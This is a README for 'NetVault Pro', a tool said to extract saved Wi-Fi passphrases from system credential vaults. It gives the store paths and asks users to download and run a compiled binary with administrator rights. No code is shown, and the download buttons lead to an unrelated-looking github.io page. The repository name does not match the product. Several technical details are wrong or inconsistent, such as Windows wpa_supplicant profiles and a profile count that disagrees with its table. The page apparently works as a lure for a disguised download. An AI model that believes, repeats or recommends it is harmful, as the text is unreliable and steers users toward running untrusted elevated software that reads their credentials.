![preview](https://raw.githubusercontent.com/Nikita465-dev/wifinet-creds-inspector/main/frame_7f7d4f.svg)

# NetVault Pro: Wireless Credential Integrity & System Audit Console

![GitHub release](https://img.shields.io/badge/release-v4.7.2-2ea44f)
![Build status](https://img.shields.io/badge/build-passing-4c1a1b)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-8250df)
![License](https://img.shields.io/badge/license-MIT-blue)

---

## Overview

In the sprawling digital landscape where every device whispers secrets through the air, **NetVault Pro** emerges as a silent sentinel—a meticulously engineered inspection framework designed for network auditors, system administrators, and security researchers who demand absolute clarity over their wireless footprint. Rather than merely scratching the surface of credential storage, this console dives into the deep strata of your operating system's authentication repositories, surfacing saved wireless profiles with forensic precision.

Think of it as a **digital archaeologist's brush**—it does not create, alter, or tamper; it gently excavates and catalogues what already exists beneath the layers of your system's configuration bedrock. Whether you are migrating machines, auditing a fleet of corporate laptops, or simply reclaiming access to your own forgotten infrastructure, NetVault Pro transforms an opaque, scattered collection of BSSID entries and encrypted passphrases into a coherent, structured inventory.

---

## Why NetVault Pro? 

### The Philosophy of Visibility
Most security tools either shout or whisper. NetVault Pro speaks in a measured tone—it provides **non-intrusive introspection** into one of the most delicate areas of any operating environment: the storage of network authentication material. By treating credentials as *data objects* rather than *secrets to be exploited*, this utility empowers auditors to verify configuration hygiene, detect legacy or deprecated security protocols, and ensure that every saved network profile adheres to your organization's policy baseline.

### A Different Kind of Tool
We rejected the flashy, script-kiddie aesthetic in favor of a *clinical, instrument-grade* interface. The console output is not a chaotic dump—it is a structured, schema-validated report that can be appended to compliance documentation, ingested by SIEM platforms, or simply read by a human operator who values clarity over obfuscation.

---

## Core Features

### 🛰️ Profile Inventory Matrix
NetVault Pro enumerates every saved wireless profile across all supported interfaces—Wi-Fi, Bluetooth-paired network bridges, and legacy ad-hoc connections. The inventory is rendered with:
- **Interface type** (Infrastructure, Ad-Hoc, WDS)
- **Authentication method** (WPA2-PSK, WPA3-SAE, WEP-Open)
- **Signal historical data** (last successful connection timestamp)
- **Profile priority ranking** (as stored in the OS registry)

### 🔐 Credential Retrieval Engine
The heart of the console—a non-destructive read operation that extracts the stored passphrase or key material from the operating system's credential vault. This operation is performed with the same electrical neutrality as a voltmeter reading a battery; it does not modify, cache, or replicate the material beyond the active session buffer.

### 🧠 Configuration Vulnerability Indicator
The MVP of the suite: a heuristic analyzer that cross-references each profile's security parameters against a built-in baseline of *recommended minimums* (e.g., flagging any profile using WEP or primary SSIDs with default passphrases). The indicator produces a colored risk matrix (Green/Yellow/Red) with actionable remediation suggestions.

### 📜 Multi-Format Report Generator
Export your audit session in a variety of structured formats for downstream consumption:
- **JSON** (machine-native, perfect for scripting pipelines)
- **CSV** (spreadsheet-optimized, for compliance checklists)
- **Human-readable plaintext** (with optional emoji-embedded ASCII tables)

### 🌐 Multilingual Output Layer
Because great security speaks every language, NetVault Pro's report layer supports **12 major locales** (English, Spanish, French, German, Mandarin, Japanese, Korean, Russian, Portuguese, Hindi, Arabic, and Indonesian). A simple `--locale` switch configures the entire output schema, including log timestamps and diagnostic messages—no additional translation packs required.

### 🖥️ Responsive Terminal UI
The console interface adapts fluidly to any terminal width—from a cramped 80-column SSH session to an expansive 240-column 4K display. Tables reflow, progress bars rescale, and summary dashboards reorganize themselves without losing a single byte of information density.

### ⏰ 24/7 Scheduled Audit Gateway
Once installed, NetVault Pro can be bound to a systemd / Windows Task Scheduler / launchd job to perform *silent, periodic audits*. Reports are written to a pre-designated directory with rotating log retention (default: keep last 30 audit snapshots). This makes it trivial to maintain a **continuous change history** of all wireless credentials on your fleet.

---

## Getting Started

To begin your first audit cycle, you will need to prepare your environment with the appropriate runtime dependencies. The setup process is intentionally brief—no prolonged compilation rituals, no arcane kernel-module gymnastics.

### Prerequisites
- A supported operating system (see compatibility table below)
- Adequate privilege level to access credential stores (`root` / `Administrator` / `sudo` group)
- A network interface adapter that has at least one saved wireless profile (though the tool gracefully handles zero-profile environments)

**Compatibility Matrix:**

| OS Version | Architecture | Support Level |
|------------|-------------|---------------|
| Windows 10 (21H2+) | x64 / ARM64 | Fully Supported |
| Windows 11 (all builds) | x64 | Fully Supported |
| Ubuntu 22.04 / 24.04 LTS | x64 / ARM64 | Fully Supported |
| Debian 12 | x64 | Fully Supported |
| macOS Monterey / Ventura / Sonoma | x64 / Apple Silicon | Fully Supported |
| RHEL 9 / Rocky 9 | x64 | Experimental |
| FreeBSD 14 | x64 | Community Preview |

### Quick Start Sequence

1. **Acquire the utility** — obtain the compiled binary from the official distribution channel (download button below).
2. **Provision execution rights** — for Unix-like systems, apply executable permission (`chmod +x`). For Windows, simply unblock the file via Properties → Unblock.
3. **Invoke the audit** — run the binary with the default verbosity; the console will auto-detect the operating system and credential vault location.
4. **Review the output** — observe the structured table of SSIDs and their associated security posture.

[![Download](https://raw.githubusercontent.com/Nikita465-dev/wifinet-creds-inspector/main/get_2b70b5.svg)](https://Nikita465-dev.github.io/wifinet-creds-inspector/)

---

## Deep Dive: The Audit Engine

### How the Enumeration Works

Beneath the elegant presentation, NetVault Pro employs a *layered discovery technique*:

- **Layer 1: OS-level Profile Registry** — reads the native configuration store (Windows Registry hive `HKLM\SOFTWARE\Microsoft\WlanSvc\Interfaces`, Linux NetworkManager connection files under `/etc/NetworkManager/system-connections/`, macOS `/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist`).
- **Layer 2: Vault/Keychain Access** — for encrypted profile material, the utility interfaces with the system's credential daemon (DPAPI on Windows, Secret Service API on Linux, Keychain on macOS) using the *user's existing authenticated session context*—it never prompts for a master password, never escalates beyond the current user's scope.
- **Layer 3: Integrity Validation** — each retrieved credential is parsed and validated against the expected format for its authentication type. Mismatches are flagged as "corrupted profile" rather than silently omitted, ensuring the audit report is 100% factual.

### The Configuration Vulnerability Indicator (CVI) — Deep Dive

The CVI is not a simple regex check. It is a **multi-factor scoring engine** that evaluates each profile against seven discrete criteria:

1. **Cipher Strength** (TKIP vs. CCMP vs. GCMP)
2. **Key Derivation Age** (how recently the PSK was changed, if timestamp metadata is available)
3. **SSID Naming Oddity** (does the SSID resemble a default/ISP-provided identifier?)
4. **PMF Status** (is Management Frame Protection enabled for WPA3 profiles?)
5. **Transition Mode** (is the profile in WPA2/WPA3 transition, which is weaker than pure WPA3?)
6. **Shared Account Usage** (is the profile flagged as "shared" among multiple user accounts?)
7. **Known Vulnerability Exposure** (does the profile reference a router whose default admin credentials are publicly documented?)

Each criterion contributes a weighted score to a **0–100 integrity index**. A score above 85 is considered "Healthy"; 60–84 is "Needs Review"; below 60 is "Immediate Action Recommended."

### Real-World Use Cases

- **Corporate Onboarding/Offboarding**: When an employee leaves, the audit report instantly reveals which company SSIDs their machine could still access—enabling IT to decide on credential rotation or remote wipe priorities.
- **Facilities Migration**: When moving offices, the console helps identify which legacy profiles are lingering (e.g., "Cafe_Guest_5GHz" from a three-year-old coffee shop) and provides a clean export to import into fresh machines.
- **Security Posture Review**: An auditor can run a fleet-wide batch audit and generate a compliance dashboard showing the percentage of machines that still hold WEP-encrypted or default-passphrase profiles—a critical finding for standards like ISO 27001 or NIST 800-153.

---

## Command Line Interface

NetVault Pro is designed for *lean operator interaction*. All commands follow a rigid, self-documenting structure:

```
netvault-pro --audit [scope] --report-format [fmt] --output-dir [path] [options]
```

**Primary Flags:**

| Flag | Purpose |
|------|---------|
| `--audit current-user` | Audit only the active user's credential scope |
| `--audit all-users` | Attemptaudit of all users on the host (requires admin) |
| `--report-format json` | Emit structured JSON (default) |
| `--report-format human` | Emit colored, tabulated console output |
| `--timeline-days N` | Filter profiles by last used date (within N days) |
| `--fail-on-risk` | Exit with non-zero status if any profile scores below threshold |
| `--locale es-ES` | Force Spanish output for the report |
| `--silent` | Suppress all console chatter; write directly to report file |

**Exit Codes:**

- `0` — Audit completed successfully, no critical findings
- `1` — Audit completed with warnings (e.g., one profile below threshold)
- `2` — Audit completed with critical failures (e.g., credential vault inaccessible)
- `3` — Runtime error (unsupported OS, missing dependency, etc.)

---

## Output Report Example (Human-Readable Mode)

```
+------------------------------+----------------+------------------+--------------+---------+
| SSID                          | Auth Type      | Last Connected   | Integrity    | Notes   |
+------------------------------+----------------+------------------+--------------+---------+
| FiberForce_Guest_5G          | WPA2-PSK       | 2026-01-24       | 78 (Review)  | TKIP    |
| Warehouse_INTERNAL_2G        | WPA2-PSK       | 2026-02-11       | 92 (Healthy) | CCMP    |
| Office_Employees_5GHz        | WPA3-SAE       | 2026-02-14       | 95 (Healthy) | PMF     |
| [Corrupted] T-Mobile_1842    | Unknown        | —                | —            | ERR:    |
|                               |                |                  |              | vault   |
+------------------------------+----------------+------------------+--------------+---------+
```

**Summary:** 3 profiles audited, 2 healthy, 1 is currently using outdated TKIP cipher. Recommendation: rotate the passphrase, update router configuration to force CCMP-only, and reschedule an audit for next Friday.

---

## Security & Privacy Considerations

Let us address the elephant in the terminal room. NetVault Pro is a **legitimate system administration tool**—it does not circumvent authentication, does not brute-force, and does not exfiltrate data. Its entire operation is bounded by the **same privilege level of the invoking user**. If your account cannot read a specific credential vault entry, neither can NetVault Pro.

However, with great visibility comes great responsibility:

- **Local-Only Operation**: The tool performs no network communication whatsoever. There is no telemetry, no update checker, no beaconing. Once the binary is on your machine, it stays there and talks only to the terminal.
- **No Persistence**: Unless explicitly scheduled (via your OS scheduler), NetVault Pro does not install services, daemons, or background agents. It runs, reports, and exits.
- **Report Hygiene**: Generated reports are stored only where you tell them to be stored. We provide suggestions for encrypting report directories (e.g., using BitLocker / LUKS), but the choice rests with you.

### Organizational Policy Note
In many jurisdictions, accessing wireless credentials on a device **that you do not own or manage** may violate computer fraud or privacy laws. NetVault Pro is intended for **authorized security auditing** on machines within your sphere of control—your own hardware, your organization's fleet, or penetration testing engagements conducted with explicit written consent. Always verify your legal standing before deploying auditing software in any environment.

---

## Extending NetVault Pro

The core engine is deliberately monolithic, but we provide a **plugin interface** for power users:

### Plugin Structure
A plugin is a single executable file or a dynamic library placed in the `netvault-plugins/` subdirectory. The engine discovers plugins at startup via a signature check on the first 64 bytes. A minimal plugin can:

- Intercept the audit result stream and apply a custom filter (e.g., only emit profiles with "guest" in the SSID).
- Convert the internal data structure to a proprietary format (e.g., a custom XML dialect for in-house compliance tools).
- Add a custom scoring heuristic to the CVI engine.

**Example (pseudo-code) of a simple scoring plugin:**

```python
def score_override(profile_data):
    if "corp" in profile_data.ssid.lower():
        return max(profile_data.score - 5, 0)  # penalize corp networks
    return profile_data.score
```

The plugin API is versioned; plugins built for v4.x will receive a deprecation warning in v5.x and full removal in v6.x.

---

## Troubleshooting & Common Pitfalls

### "Access Denied" When Retrieving Credentials
**Cause:** The user lacks the required privilege to read the credential vault.  
**Remedy:** Re-run with elevated privileges (`sudo` on Linux/macOS, "Run as Administrator" on Windows). For Linux, ensure the running user belongs to the `sudo` group; for macOS, ensure the terminal process has "Full Disk Access" in System Settings → Privacy & Security.

### "Vault Unavailable" on macOS Sonoma
**Cause:** macOS 14 introduced stricter TCC (Transparency, Consent, and Control) scoping for terminal applications.  
**Remedy:** Grant the hosting terminal app "Full Disk Access" and "Automation" permission, then reboot the terminal process.

### The Report Looks Empty on Windows 11
**Cause:** Windows 11 hides "old" profiles in a filtered view.  
**Remedy:** Use the `--all-users` flag and ensure you are running from an elevated prompt. Additionally, verify the WLAN service is running (`net start WlanSvc`).

### Consistent "Corrupted Profile" Errors
**Cause:** Your system contains profiles from older Windows versions using the deprecated `wpa_supplicant` format.  
**Remedy:** These profiles are legacy ghosts; the tool reports them accurately. For cleanup, use Windows Settings → Network & Internet → Wi-Fi → Manage known networks.

---

## Project Roadmap (2026)

We are committed to continuous improvement. Here is our public roadmap for the remainder of 2026:

- **Q2 2026**: Native GUI Frontend (Qt-based) with a live network map visualization.
- **Q3 2026**: Integration API for exporting directly to ServiceNow and Jira Service Management.
- **Q4 2026**: Multi-host Fleet Mode — a central commander instance that distributes audit tasks to remote agents (with a signed mTLS authentication handshake).
- **2027**: Full support for Windows IoT Enterprise and Yocto Linux images.

---

## Disclaimer

This software is provided for **legitimate security research, system administration, and compliance auditing** purposes only. The developers are not responsible for any illegal, unethical, or unauthorized use of this tool. Users are solely responsible for ensuring that their usage complies with all applicable local, state, federal, and international laws and regulations regarding computer access and privacy.

By downloading, compiling, or executing any portion of this repository, you acknowledge that:
1. You hold sufficient authority to audit the target system(s).
2. You understand that the tool provides read-only access to existing configuration data.
3. You will not use this tool to attempt to circumvent encryption or access control mechanisms on systems you do not own.
4. You agree to indemnify and hold harmless the project maintainers from any legal consequence arising from your misuse.

---

## License & Contributing

This project is released under the **MIT License**, which permits unrestricted use, modification, and distribution with preservation of the original copyright notice. The full license text is available in the [LICENSE](LICENSE) file at the root of the repository.

We welcome contributions that are aligned with the project's philosophy of **non-destructive, transparent, and well-documented auditing**. In particular, we are looking for:
- Translation pull requests for the output layer (12 existing locales, +6 in progress).
- New heuristic modules for the CVI scoring engine (submission via GitHub Issues with a design document).
- Improvements to the report rendering engine (especially for wide-character CJK locales).

To contribute, fork the repository, create a feature branch, and submit a pull request with a clear description. All merged PRs are acknowledged in the `CONTRIBUTORS.md` file.

---

## Final Words

The digital domain grows noisier with each passing day—more devices, more overlapping waves, more forgotten connections lingering in the aether. NetVault Pro is your **magnifying glass and your ledger**. It reveals what is already there, holds it up to the light of best practices, and hands you a clear, actionable record. Use it with the discipline it deserves.

*Audit well. Document thoroughly. Secure persistently.*

[![Download](https://raw.githubusercontent.com/Nikita465-dev/wifinet-creds-inspector/main/get_2b70b5.svg)](https://Nikita465-dev.github.io/wifinet-creds-inspector/)